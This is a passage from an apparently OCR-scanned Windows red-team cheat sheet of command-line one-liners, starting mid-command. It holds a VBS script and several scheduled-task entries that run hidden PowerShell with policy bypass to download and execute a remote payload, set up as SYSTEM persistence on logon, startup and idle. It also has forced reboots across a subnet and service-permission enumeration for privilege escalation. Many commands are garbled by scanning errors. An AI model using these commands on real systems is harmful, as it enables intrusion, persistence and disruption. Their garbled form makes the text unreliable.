netrnask gw ID %1 ping 127.0.0.1 -n l -w 10000 nul %1)
```

### DNS reverse lookup

```text
for /L %i in (100, 1, 105)
dns.txt && echo Server:
do @ nslookup 1.1.1.%i I findstr /i /c:''Name''
1.1.1.%i dns.txt
```

### Search for files beginning with the work "PASS" and the print if it's a directory, file data/time, relative path, actual path and size \(@variable are optional\)

```text
forfi1es /P c:\temp /s /m pass -c "cmd /c echo @isdir @fdate @ftime
@relpath @path @fsize"
```

### Simulate malicious domain callouts \(useful for av/ids testing\)

```text
# Run packet capture on attack domain to receive callout
# domains.txt should contain known malicious domains
for /L %i in (0,1,100) do (for /F %n in (domains.txt) do nslookup %n
attack domain NUL 2 &1 & ping -n 5 127.0.0.1 NUL 2 &1
```

### IE web looper \(traffic generator\)

```text
for /L %C in (1,1,5000) do @for %U in (www.yahoo.com www.pastebin.com
www.paypal.com www.craigslist.org www.google.com) do start /b iexplore %U &
ping -n 6 localhost & taskkill /F /IM iexplore.exe
```

### Get permission on service executables 

```text
for /f "tokens=2 delims='='" %a in ('wmic service list full | find /i
"pathname" I find /i /v "system32"') do @echo %a
c:\windows\temp\3afd4ga.tmp
for /f eol = " delims = " %a in (c:\windows\temp\3afd4ga.tmp) do cmd.exe
/c icacls ''%a''
```

### Rolling reboot \(replace /R with /S for a shutdown\):

```text
for /L %i in (2,1,254) do shutdown /r /m \\1.1.1.%i /f /t 0 /c "Reboot
message"
```

### Shell escalation using VBS \(need elevated credentials\)

```text
# Create .vbs script with the following
Set shell wscript.createobject("wscript.shell")
Shell.run "runas /user: user " & """" &
C:\Windows\System32\WindowsPowershell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Nonlnteractive -ep bjpass -nop -c \" & """" & "IEX ((New-
Object Net.WEbClieil':).downloadstring(' url '))\" & """" & """"
wscript.sleep (100)
shell.Sendkeys " password " & "{ENTER}"
```

## Task scheduler

```text
Scheduled tasks binary paths CANNOT contain spaces because everything
after the first space in the path is considered to be a command-line
argument. Enclose the /TR path parameter between backslash (\) AND
quotation marks ("):
... /TR "\"C:\Program Files\file.exe\" -x arg1"
```

### Task scheduler \(ST=start time, SD=start date, ED=end date\) \*Must be admin

```text
SCHTASKS /CREATE /TN Task Name /SC HOURLY /ST HH:MM /F /RL HIGHEST /SD
MM/DD/YYYY /ED MM/DD/YYYY /tr "C:\my.exe" /RU DOMAIN/user /RP
password
```

### Task scheduler persistence \[10\]

```text
For 64 bit use:
"C:\Windows\syswow64\WindowsPowerShell\vl.O\powershell.exe"
# (x86) on User Login
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring( ''http:// ip : port I payload'''))'" /SC
onlogon /RU System
# (x86) on System Start
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bypass -nap -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onstart /RU System
# (x86) on User Idle (30 Minutes)
SCHTASKS /CREATE /TN Task Name /TR
"C:\Windows\System32\WindowsPowerShell\vl.O\powershell.exe -WindowStyle
hidden -NoLogo -Noninteractive -ep bjpass -nop -c 'IEX ((new-object
net.webclient) .downloadstring("http:// ip : port I payload"))'" /SC
onidle /i 30
```
